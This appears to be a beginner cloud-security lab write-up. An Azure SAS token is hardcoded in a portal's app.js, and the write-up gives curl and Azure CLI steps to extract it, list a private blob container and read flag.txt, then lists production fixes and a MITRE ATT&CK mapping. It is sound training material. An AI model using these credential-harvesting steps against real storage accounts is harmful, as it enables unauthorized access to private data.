# Blob SAS Token Exposure

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Storage / Credential Exposure

## Scenario

A developer built an internal employee portal that reads documents from Azure Blob Storage.
To "simplify" the client-side code, they hardcoded a **Shared Access Signature (SAS) token**
directly in `app.js`. The SAS token has **read + list** permissions scoped to the entire
storage account (not just the public web container) and expires in 2030.

The portal's static files are served from a public `$web` container. Any visitor who
inspects the JavaScript source finds the SAS token and can use it to access the private
`secrets` container — including `flag.txt`.

## Attack Path

```
[Attacker]
    |
    v
Browse to web endpoint  -->  view page source  -->  app.js
    |
    v
Extract SAS_TOKEN from JavaScript variable
    |
    v
List private container:
  GET /secrets?restype=container&comp=list&<sas>
    |
    v
Read flag:
  GET /secrets/flag.txt?<sas>
```

### Step 1 — Fetch app.js and extract the SAS token

```bash
curl <app_js_url>
# Look for: const SAS_TOKEN = "?sv=...";
```

Extract the value of `SAS_TOKEN` (the full query string starting with `?sv=`).

### Step 2 — List the private container

```bash
ACCOUNT="<storage_account_name>"
SAS="<extracted_sas_token>"   # starts with ?sv=

curl "https://${ACCOUNT}.blob.core.windows.net/secrets?restype=container&comp=list&${SAS:1}"
# Note: strip the leading '?' since we append after '?restype=...'
```

Or simply use the Azure CLI:

```bash
az storage blob list \
  --account-name <account> \
  --container-name secrets \
  --sas-token "<sas_token>" \
  --query "[].name" -o tsv
```

### Step 3 — Read the flag

```bash
curl "https://${ACCOUNT}.blob.core.windows.net/secrets/flag.txt${SAS}"

# Or with the CLI:
az storage blob download \
  --account-name <account> \
  --container-name secrets \
  --name flag.txt \
  --sas-token "<sas_token>" \
  --file /dev/stdout
```

## How to Fix in Production

1. **Never embed SAS tokens in client-side code** — tokens in JavaScript are visible to
   anyone who views the page source.
2. **Use a backend proxy**: the server fetches blobs using a managed identity and returns
   only what the authenticated user is authorised to see.
3. **Scope SAS tokens tightly**: generate per-blob, short-lived SAS tokens server-side
   rather than account-level tokens with multi-year expiry.
4. **Use User Delegation SAS** (backed by Entra ID credentials) rather than account key
   SAS — they can be revoked by revoking the user's access.
5. **Enable Defender for Storage** to alert on anomalous SAS token usage patterns.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Storage Object Discovery | T1619 |
| Data from Cloud Storage | T1530 |
